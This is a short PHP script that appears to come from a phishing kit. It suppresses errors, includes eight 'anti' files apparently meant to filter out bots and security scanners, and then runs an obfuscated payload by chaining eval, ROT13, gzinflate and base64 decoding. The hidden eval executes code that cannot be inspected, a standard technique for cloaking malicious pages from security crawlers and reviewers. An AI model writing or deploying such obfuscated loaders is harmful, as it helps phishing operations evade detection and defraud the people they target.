<?php



session_start();
error_reporting(0);
include_once 'anti/anti1.php';
include_once 'anti/anti2.php';
include_once 'anti/anti3.php';
include_once 'anti/anti4.php';
include_once 'anti/anti5.php';
include_once 'anti/anti6.php';
include_once 'anti/anti7.php';
include_once 'anti/anti8.php';
include_once 'functions.php';
eval(str_rot13(gzinflate(base64_decode(block_servers()))));
?>